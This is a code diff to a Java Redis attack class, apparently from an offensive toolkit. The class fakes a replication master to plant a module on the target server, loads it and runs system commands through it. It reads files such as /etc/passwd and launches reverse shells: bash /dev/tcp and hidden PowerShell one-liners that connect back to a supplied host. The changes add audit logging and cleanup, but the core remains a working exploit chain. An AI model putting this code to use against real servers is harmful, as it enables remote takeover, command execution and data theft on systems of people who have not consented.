@@ -1,71 +1,112 @@
 package database;
 
-import redis.clients.jedis.Jedis;
-import redis.clients.jedis.HostAndPort;
 import redis.clients.jedis.DefaultJedisClientConfig;
+import redis.clients.jedis.HostAndPort;
+import redis.clients.jedis.Jedis;
 import redis.clients.jedis.params.ScanParams;
 import redis.clients.jedis.resps.ScanResult;
 
+import java.io.BufferedReader;
+import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
-import java.io.ByteArrayOutputStream;
-import java.io.OutputStream;
-import java.io.BufferedReader;
 import java.io.InputStreamReader;
-import java.net.URISyntaxException;
-import java.net.URL;
+import java.io.OutputStream;
 import java.net.InetAddress;
+import java.net.InetSocketAddress;
 import java.net.NetworkInterface;
 import java.net.ServerSocket;
 import java.net.Socket;
-import java.nio.file.*;
+import java.net.URISyntaxException;
+import java.net.URL;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.DirectoryStream;
+import java.nio.file.FileSystems;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.nio.file.StandardOpenOption;
 import java.util.ArrayList;
+import java.util.Base64;
+import java.util.Collections;
 import java.util.Enumeration;
 import java.util.List;
+import java.util.Map;
 import java.util.jar.JarEntry;
 import java.util.jar.JarFile;
-import java.util.Collections;
-import java.util.Base64;
+import java.util.logging.Level;
+import java.util.logging.Logger;
 
 public class redis {
 
+    private static final Logger LOG = Logger.getLogger(redis.class.getName());
+    private static final int CHUNK_SIZE = 2048;
+
     private final String host;
     private final int port;
+    private final int dbIndex;
     private final String password;
     private Jedis jedis;
-    private static final int CHUNK_SIZE = 2048;
 
     public redis(String host, String port, String database, String username, String password) {
         this.host = host;
-        this.port = Integer.parseInt(port);
+        this.port = parsePort(port, 6379);
+        // 历史版本忽略了 database（Redis 逻辑库索引），此处补齐
+        int idx = 0;
+        if (database != null && !database.trim().isEmpty()) {
+            try {
+                idx = Integer.parseInt(database.trim());
+            } catch (NumberFormatException ignored) {
+                idx = 0;
+            }
+        }
+        this.dbIndex = Math.max(0, Math.min(idx, 15));
         this.password = (password == null) ? "" : password;
         connect();
+    }
+
+    private static int parsePort(String p, int def) {
+        try {
+            int v = Integer.parseInt(p == null ? "" : p.trim());
+            return (v >= 1 && v <= 65535) ? v : def;
+        } catch (NumberFormatException e) {
+            return def;
+        }
     }
 
     private void connect() {
         if (jedis != null) return;
         DefaultJedisClientConfig cfg = DefaultJedisClientConfig.builder()
                 .password((password == null || password.isEmpty()) ? null : password)
+                .database(dbIndex)
+                .connectionTimeoutMillis(15000)
+                .socketTimeoutMillis(15000)
                 .build();
         jedis = new Jedis(new HostAndPort(host, port), cfg);
     }
 
     public void close() {
-        try {
-            if (jedis != null) jedis.close();
-        } catch (Exception ignored) {
+        if (jedis != null) {
+            try {
+                jedis.close();
+            } catch (Exception ignored) {
+            } finally {
+                jedis = null;
+            }
         }
     }
 
     public boolean testConnection() {
         DefaultJedisClientConfig cfg = DefaultJedisClientConfig.builder()
                 .password((password == null || password.isEmpty()) ? null : password)
+                .database(dbIndex)
+                .connectionTimeoutMillis(10000)
                 .build();
         try (Jedis tmp = new Jedis(new HostAndPort(host, port), cfg)) {
             String pong = tmp.ping();
             return pong != null && pong.toLowerCase().contains("pong");
         } catch (Exception e) {
-            e.printStackTrace();
+            LOG.log(Level.INFO, "[!] 连接测试失败: " + e.getMessage());
             return false;
         }
     }
@@ -81,7 +122,8 @@ public class redis {
             } catch (Exception ignored) {
             }
 
-            sb.append("[+] Connected: ").append(host).append(":").append(port).append("\n");
+            sb.append("[+] Connected: ").append(host).append(":").append(port)
+                    .append(" (db ").append(dbIndex).append(")\n");
             return sb.toString();
         } catch (Exception e) {
             return "";
@@ -92,13 +134,22 @@ public class redis {
      * 自动判断系统类型并将内置模块写入临时目录，然后 MODULE LOAD。
      * 首选资源路径（统一命名）：/redis/modules/redis.dll（Windows）或 /redis/modules/redis.so（Linux/macOS）。
      * 若未找到，则回退到旧结构：/redis/modules/{windows|linux|mac}/{32|64}/。
+     *
+     * 注意：本方法会向目标写入并加载模块，属于侵入性操作，仅应在用户显式触发时调用。
      */
     public String autoLoadModuleFromResources() {
+        long t0 = System.currentTimeMillis();
+        String result = autoLoadModuleFromResourcesInner();
+        util.AuditLogger.log("MODULE_AUTO_LOAD", "Redis", host, String.valueOf(port),
+                String.valueOf(dbIndex), "", "auto module load attempt", result,
+                System.currentTimeMillis() - t0);
+        return result;
+    }
+
+    private String autoLoadModuleFromResourcesInner() {
         try {
             String osKey = detectOSKeyFromRedis();
             String bits = detectBitsFromRedis();
-            System.out.println(osKey);
-            System.out.println(bits);
             String resourceDir = "/redis/" + osKey + "/" + bits + "/";
             String expectedName;
             switch (osKey) {
@@ -160,11 +211,13 @@ public class redis {
     }
 
     private String pushModuleViaReplication(byte[] moduleBytes, String targetDir, String targetName) {
+        String effectiveName = targetName;
+        String effectiveDir = targetDir;
+        RogueMaster master = null;
         try {
             String sep = targetDir.contains("\\") ? "\\" : "/";
             if (!targetDir.endsWith(sep)) targetDir += sep;
 
-            String effectiveName = targetName;
             try {
                 jedis.configSet("dbfilename", targetName);
             } catch (Exception eDb) {
@@ -175,7 +228,6 @@ public class redis {
                 effectiveName = currentName;
             }
 
-            String effectiveDir = targetDir;
             try {
                 jedis.configSet("dir", targetDir);
             } catch (Exception eDir) {
@@ -193,20 +245,30 @@ public class redis {
             }
 
             byte[] rdbPayload = MinimalRDB.buildWithStringKV("turacos:module_blob", moduleBytes);
-            RogueMaster master = new RogueMaster(rdbPayload);
-            master.start();
             String localIp = getLocalIpPreferIPv4();
-            int servePort = master.getPort();
+            master = new RogueMaster(rdbPayload, localIp);
+            master.start();
 
-            jedis.slaveof(localIp, servePort);
+            jedis.slaveof(localIp, master.getPort());
             boolean served = master.awaitServed(8000);
-            jedis.slaveofNoOne();
-            master.stop();
-
-            if (!served) return "[!] 复制推送失败：未完成有效的 RDB 传输";
+            if (!served) {
+                return "[!] 复制推送失败：未完成有效的 RDB 传输";
+            }
             return effectiveDir + effectiveName;
         } catch (Exception e) {
             return "[!] 复制投送异常: " + e.getMessage();
+        } finally {
+            // 关键清理：无论成功失败都恢复主从状态并关闭本地服务，
+            // 避免将目标 Redis 遗留在"指向本地临时端口的从库"状态
+            if (jedis != null) {
+                try {
+                    jedis.slaveofNoOne();
+                } catch (Exception ignored) {
+                }
+            }
+            if (master != null) {
+                master.stop();
+            }
         }
     }
 
@@ -311,40 +373,64 @@ public class redis {
         }
     }
 
+    /**
+     * 读取 Redis 配置项。
+     * Jedis 4+ 的 configGet 返回 Map<String,String>（旧版为 List），
+     * 此处做防御式兼容，避免 ClassCastException 导致配置读取永远失败。
+     */
     private String getConfigValue(String key) {
+        Object raw = null;
         try {
-            List<String> list = (List<String>) jedis.configGet(key);
-            if (list != null && list.size() >= 2 && key.equalsIgnoreCase(list.get(0))) {
-                return list.get(1);
-            }
+            raw = jedis.configGet(key);
         } catch (Exception ignored) {
         }
+        String v = extractConfig(raw, key);
+        if (v != null) return v;
         try {
-            List<String> all = (List<String>) jedis.configGet("*");
-            if (all != null) {
-                for (int i = 0; i + 1 < all.size(); i += 2) {
-                    if (key.equalsIgnoreCase(all.get(i))) {
-                        return all.get(i + 1);
-                    }
+            raw = jedis.configGet("*");
+        } catch (Exception ignored) {
+        }
+        v = extractConfig(raw, key);
+        return v;
+    }
+
+    @SuppressWarnings("unchecked")
+    private static String extractConfig(Object raw, String key) {
+        if (raw instanceof Map) {
+            Map<String, String> m = (Map<String, String>) raw;
+            return m.get(key);
+        }
+        if (raw instanceof List) {
+            List<String> l = (List<String>) raw;
+            for (int i = 0; i + 1 < l.size(); i += 2) {
+                if (key.equalsIgnoreCase(l.get(i))) {
+                    return l.get(i + 1);
                 }
             }
-        } catch (Exception ignored) {
         }
         return null;
     }
 
+    /**
+     * 伪造 Redis 主节点，向连接端提供 RDB 内容。
+     * 仅绑定到指定的本机 IP（而不是 0.0.0.0），避免局域网内任意主机
+     * 意外 PSYNC 到本地临时端口。
+     */
     private static class RogueMaster {
         private final byte[] payload;
+        private final String bindIp;
         private ServerSocket server;
         private volatile boolean served = false;
         private Thread thread;
 
-        RogueMaster(byte[] payload) {
+        RogueMaster(byte[] payload, String bindIp) {
             this.payload = payload;
+            this.bindIp = bindIp;
         }
 
         void start() throws IOException {
-            server = new ServerSocket(0);
+            server = new ServerSocket();
+            server.bind(new InetSocketAddress(bindIp, 0), 1);
             thread = new Thread(() -> {
                 try (Socket s = server.accept()) {
                     BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
@@ -426,7 +512,7 @@ public class redis {
                 writeLen(out, 0);
 
                 out.write(OP_STRING);
-                byte[] k = key.getBytes("UTF-8");
+                byte[] k = key.getBytes(StandardCharsets.UTF_8);
                 writeLen(out, k.length);
                 out.write(k);
                 writeLen(out, value.length);
@@ -510,12 +596,7 @@ public class redis {
 
     private String detectOSKeyFromRedis() {
         try {
-            String info;
-            try {
-                info = jedis.info("server");
-            } catch (Exception e) {
-                info = jedis.info();
-            }
+            String info = jedis.info("server");
             String osLine = null;
             for (String line : info.split("\r?\n")) {
                 if (line.startsWith("os:")) {
@@ -529,15 +610,9 @@ public class redis {
                 if (l.contains("mac") || l.contains("darwin")) return "mac";
                 if (l.contains("linux")) return "linux";
             }
-            String osName = System.getProperty("os.name", "").toLowerCase();
-            if (osName.contains("win")) return "windows";
-            if (osName.contains("mac") || osName.contains("darwin")) return "mac";
-            return "linux";
+            return localOsKey();
         } catch (Exception e) {
-            String osName = System.getProperty("os.name", "").toLowerCase();
-            if (osName.contains("win")) return "windows";
-            if (osName.contains("mac") || osName.contains("darwin")) return "mac";
-            return "linux";
+            return localOsKey();
         }
     }
 
@@ -565,20 +640,26 @@ public class redis {
                 if (l.contains("x86_64") || l.contains("64")) return "64";
                 if (l.contains("x86") || l.contains("32")) return "32";
             }
-            String bits = System.getProperty("sun.arch.data.model");
-            if (bits != null && (bits.equals("32") || bits.equals("64"))) return bits;
-            String arch = System.getProperty("os.arch", "").toLowerCase();
-            if (arch.contains("64")) return "64";
-            if (arch.contains("86")) return "32";
-            return "64";
+            return localBits();
         } catch (Exception e) {
-            String bits = System.getProperty("sun.arch.data.model");
-            if (bits != null && (bits.equals("32") || bits.equals("64"))) return bits;
-            String arch = System.getProperty("os.arch", "").toLowerCase();
-            if (arch.contains("64")) return "64";
-            if (arch.contains("86")) return "32";
-            return "64";
+            return localBits();
         }
+    }
+
+    private static String localOsKey() {
+        String osName = System.getProperty("os.name", "").toLowerCase();
+        if (osName.contains("win")) return "windows";
+        if (osName.contains("mac") || osName.contains("darwin")) return "mac";
+        return "linux";
+    }
+
+    private static String localBits() {
+        String bits = System.getProperty("sun.arch.data.model");
+        if (bits != null && (bits.equals("32") || bits.equals("64"))) return bits;
+        String arch = System.getProperty("os.arch", "").toLowerCase();
+        if (arch.contains("64")) return "64";
+        if (arch.contains("86")) return "32";
+        return "64";
     }
 
     private static String getSingleFileResourcePath(String resourceDir) {
@@ -647,6 +728,33 @@ public class redis {
         }
     }
 
+    /** SCAN 分页结果。 */
+    public record ScanPage(List<String> keys, String nextCursor) {
+    }
+
+    /** 基于 SCAN 的键分页（避免 KEYS * 阻塞与一次性拉取过多）。 */
+    public ScanPage scanKeys(String cursor, int count) {
+        try {
+            ScanParams params = new ScanParams().count(Math.max(count, 10));
+            ScanResult<String> res = jedis.scan(cursor == null || cursor.isEmpty() ? "0" : cursor, params);
+            return new ScanPage(res.getResult() != null ? res.getResult() : List.of(),
+                    res.getCursor());
+        } catch (Exception e) {
+            return new ScanPage(List.of(), "0");
+        }
+    }
+
+    /** 单值预览截断上限（字符）。 */
+    private static final int PREVIEW_MAX = 4096;
+    /** 集合类型预览条目上限。 */
+    private static final int PREVIEW_ITEMS = 200;
+
+    private static String clip(String v) {
+        if (v == null) return null;
+        if (v.length() <= PREVIEW_MAX) return v;
+        return v.substring(0, PREVIEW_MAX) + "... [已截断，总长 " + v.length() + " 字符]";
+    }
+
     public List<String> getKeyPreview(String key) {
         try {
             String type = jedis.type(key);
@@ -655,13 +763,40 @@ public class redis {
             switch (type) {
                 case "string" -> {
                     String v = jedis.get(key);
-                    out.add(v != null ? v : "(nil)");
+                    out.add(clip(v != null ? v : "(nil)"));
                 }
-                case "list" -> out.addAll(jedis.lrange(key, 0, 100));
-                case "set" -> out.addAll(jedis.smembers(key));
-                case "hash" -> jedis.hgetAll(key).forEach((k, v) -> out.add(k + "=" + v));
-                case "zset" ->
-                        jedis.zrangeWithScores(key, 0, 100).forEach(t -> out.add(t.getElement() + ":" + t.getScore()));
+                case "list" -> {
+                    List<String> vals = jedis.lrange(key, 0, PREVIEW_ITEMS);
+                    for (String v : vals) out.add(clip(v));
+                    if (vals.size() > PREVIEW_ITEMS) out.add("... [更多条目未展示]");
+                }
+                case "set" -> {
+                    java.util.Set<String> vals = jedis.smembers(key);
+                    int i = 0;
+                    for (String v : vals) {
+                        if (i++ >= PREVIEW_ITEMS) {
+                            out.add("... [更多条目未展示]");
+                            break;
+                        }
+                        out.add(clip(v));
+                    }
+                }
+                case "hash" -> {
+                    var all = jedis.hgetAll(key);
+                    int i = 0;
+                    for (var e : all.entrySet()) {
+                        if (i++ >= PREVIEW_ITEMS) {
+                            out.add("... [更多字段未展示]");
+                            break;
+                        }
+                        out.add(clip(e.getKey() + "=" + e.getValue()));
+                    }
+                }
+                case "zset" -> {
+                    var all = jedis.zrangeWithScores(key, 0, PREVIEW_ITEMS);
+                    for (var t : all) out.add(clip(t.getElement() + ":" + t.getScore()));
+                    if (all.size() > PREVIEW_ITEMS) out.add("... [更多条目未展示]");
+                }
                 default -> out.add("(unsupported type)");
             }
             return out;
@@ -671,8 +806,10 @@ public class redis {
     }
 
     private static void writeStreamToFile(InputStream is, Path outPath) throws IOException {
-        Files.createDirectories(outPath.getParent());
-        try (var os = Files.newOutputStream(outPath, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING)) {
+        if (outPath.getParent() != null) {
+            Files.createDirectories(outPath.getParent());
+        }
+        try (OutputStream os = Files.newOutputStream(outPath, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING)) {
             byte[] buf = new byte[CHUNK_SIZE];
             int len;
             while ((len = is.read(buf)) != -1) {
@@ -682,30 +819,32 @@ public class redis {
     }
 
     public String moduleLoad(String modulePath) {
+        long t0 = System.currentTimeMillis();
+        String result;
         try {
-            try {
-                String lua = "return redis.call('MODULE','LOAD',ARGV[1])";
-                Object res = jedis.eval(lua, Collections.emptyList(), Collections.singletonList(modulePath));
-                return "[+] MODULE LOAD 成功: " + String.valueOf(res);
-            } catch (Exception ignored) {
-            }
-
-            try {
-                String lua2 = "return redis.call('MODULE','LOAD',ARGV[1])";
-                Object res2 = jedis.eval(lua2, Collections.emptyList(), Collections.singletonList(modulePath));
-                return "[+] MODULE LOAD 成功: " + String.valueOf(res2);
-            } catch (Exception e2) {
-                return "[!] MODULE LOAD 失败: " + e2.getMessage() + "\n[!] 若 Redis 非本机，模块文件需存在于服务器路径: " + modulePath;
-            }
+            String lua = "return redis.call('MODULE','LOAD',ARGV[1])";
+            Object res = jedis.eval(lua, Collections.emptyList(), Collections.singletonList(modulePath));
+            result = "[+] MODULE LOAD 成功: " + String.valueOf(res);
         } catch (Exception e) {
-            return "[!] MODULE LOAD 执行异常: " + e.getMessage();
+            result = "[!] MODULE LOAD 失败: " + e.getMessage() + "\n[!] 若 Redis 非本机，模块文件需存在于服务器路径: " + modulePath;
         }
+        util.AuditLogger.log("MODULE_LOAD", "Redis", host, String.valueOf(port),
+                String.valueOf(dbIndex), "", modulePath, result, System.currentTimeMillis() - t0);
+        return result;
     }
 
     /**
      * 通过模块执行系统命令，尝试多候选命令名（system.exec/sys.exec/exec）。
      */
     public String exCmd(String type, String cmd) {
+        long t0 = System.currentTimeMillis();
+        String result = exCmdInner(type, cmd);
+        util.AuditLogger.log("EXEC_CMD", "Redis", host, String.valueOf(port),
+                String.valueOf(dbIndex), "", cmd, result, System.currentTimeMillis() - t0);
+        return result;
+    }
+
+    private String exCmdInner(String type, String cmd) {
         if (cmd == null || cmd.isEmpty()) cmd = "whoami";
         try {
             if (!"MODULE".equalsIgnoreCase(type) && !"LUA".equalsIgnoreCase(type)) {
@@ -731,6 +870,14 @@ public class redis {
      * 通过模块读取文件，尝试多候选命令名（system.read/sys.read/read）。
      */
     public String readFiles(String path, String type) {
+        long t0 = System.currentTimeMillis();
+        String result = readFilesInner(path, type);
+        util.AuditLogger.log("READ_FILE", "Redis", host, String.valueOf(port),
+                String.valueOf(dbIndex), "", path, result, System.currentTimeMillis() - t0);
+        return result;
+    }
+
+    private String readFilesInner(String path, String type) {
         if (path == null || path.trim().isEmpty()) path = "/etc/passwd";
         path = path.trim();
         try {
@@ -755,8 +902,8 @@ public class redis {
             }
 
             return "[!] 未找到可用的模块命令用于读取: system.read/sys.read/read\n" +
-                   "[>] 可能原因：未加载写文件/读文件模块，或被 ACL 拦截\n" +
-                   "[>] 建议：先加载模块，或改用 LUA 方式进行读取";
+                    "[>] 可能原因：未加载写文件/读文件模块，或被 ACL 拦截\n" +
+                    "[>] 建议：先加载模块，或改用 LUA 方式进行读取";
         } catch (Exception e) {
             return "[!] 读取失败: " + e.getMessage();
         }
@@ -764,20 +911,66 @@ public class redis {
 
     public void reverseShell(String host, int port) {
         List<String> cmds = new ArrayList<>();
-        cmds.add("bash -c 'bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1'");
-        cmds.add("/bin/bash -c 'bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1'");
-        cmds.add("powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('" + host + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\"");
+        // 根据目标 OS 优先选择合适命令，避免在 Windows 上先试 bash 浪费循环
+        String osKey = localOsKey();
+        try {
+            osKey = detectOSKeyFromRedis();
+        } catch (Exception ignored) {
+        }
+        if ("windows".equalsIgnoreCase(osKey)) {
+            cmds.add("powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('" + host + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\"");
+        } else {
+            cmds.add("bash -c 'bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1'");
+            cmds.add("/bin/bash -c 'bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1'");
+        }
 
+        long t0 = System.currentTimeMillis();
+        boolean invoked = false;
         for (String c : cmds) {
             String[] candidates = {"system.exec", "sys.exec", "exec"};
             for (String fn : candidates) {
                 try {
                     String script = "return redis.call('" + fn + "', ARGV[1])";
-                    Object res = jedis.eval(script, Collections.emptyList(), Collections.singletonList(c));
-                    if (res != null) break;
+                    jedis.eval(script, Collections.emptyList(), Collections.singletonList(c));
+                    invoked = true;
+                    break;
                 } catch (Exception ignored) {
                 }
             }
+            if (invoked) break;
+        }
+        util.AuditLogger.log("REVERSE_SHELL", "Redis", host, String.valueOf(port),
+                String.valueOf(dbIndex), "", host + ":" + port,
+                invoked ? "module exec invoked" : "FAILED: no usable module command",
+                System.currentTimeMillis() - t0);
+    }
+
+    /** 供合规检查模块读取单项配置。 */
+    public String configGetValue(String key) {
+        return getConfigValue(key);
+    }
+
+    /** 供合规检查模块读取 INFO 分段。 */
+    public String serverInfo(String section) {
+        try {
+            return jedis.info(section);
+        } catch (Exception e) {
+            try {
+                return jedis.info();
+            } catch (Exception e2) {
+                return "";
+            }
+        }
+    }
+
+    /** 供合规检查模块读取 ACL 列表（不支持时返回空串）。 */
+    public String aclList() {
+        try {
+            Object r = jedis.eval("return redis.call('ACL','LIST')",
+                    Collections.emptyList(), Collections.emptyList());
+            return r == null ? "" : String.valueOf(r);
+        } catch (Exception e) {
+            return "";
         }
     }
 }
